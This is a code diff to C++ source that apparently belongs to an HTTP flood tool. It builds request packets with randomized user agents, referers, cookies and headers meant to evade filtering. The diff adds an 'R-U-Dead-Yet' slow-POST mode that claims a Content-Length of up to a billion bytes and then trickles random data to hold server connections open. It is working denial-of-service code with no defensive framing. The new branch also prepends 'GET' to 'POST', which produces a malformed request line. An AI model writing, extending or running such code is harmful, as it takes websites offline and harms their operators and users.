@@ -54,7 +54,7 @@ namespace Randomizer{
         std::vector<std::string> caching{"no-cache", "max-age=0"};
         std::vector<std::string> charset{"ISO-8859-1", "utf-8", "Windows-1251", "ISO-8859-2", "ISO-8859-15"};
         std::vector<std::string> contenttype{"multipart/form-data", "application/x-url-encoded"};
-        std::vector<std::string> methods{"GET", "POST", "HEAD"};
+        std::vector<std::string> methods{"GET", "HEAD"};
         std::vector<std::string> referer{"https://www.google.com/", "https://www.yahoo.com/", "https://www.bing.com/",
                                          "https://twitter.com/", "https://www.facebook.com/", "https://www.msn.com/",
                                          "https://www.youtube.com/", "https://yandex.com/", "https://www.amazon.com/"};
@@ -115,6 +115,34 @@ namespace Randomizer{
                               + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
                               + " \r\nReferer: " + referer[0]
                               + " \r\nContent-Type: " + contenttype[0]
+                              + " \r\nCookie: " + randomstr() + "=" + randomstr()
+                              + " \r\nAccept: */*"
+                              + " \r\nDNT: " + std::to_string(randomInt(0, 1))
+                              + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
+                              + " \r\n";
+                }
+                return packet.c_str();
+            }
+            case config::Rudy:{
+                if(keep_alive){
+                    packet += Randomizer::randomstr();
+                }else{
+                    packet += methods[0] + "POST /";
+                    if(conf->RandomizeHeader){
+                        packet += randomstr();
+                    }
+                    packet += " HTTP/1.0\r\nUser-Agent: ";
+                    if(conf->RandomizeUserAgent){
+                        packet += randomUserAgent(conf);
+                    }else{
+                        packet += conf->useragents[0];
+                    }
+                    packet += " \r\nCache-Control: " + caching[0]
+                              + " \r\nAccept-Encoding: " + encoding[0]
+                              + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
+                              + " \r\nReferer: " + referer[0]
+                              + " \r\nContent-Type: " + contenttype[0]
+                              + " \r\nContent-Length: " + std::to_string(randomInt(100000000, 1000000000))
                               + " \r\nCookie: " + randomstr() + "=" + randomstr()
                               + " \r\nAccept: */*"
                               + " \r\nDNT: " + std::to_string(randomInt(0, 1))
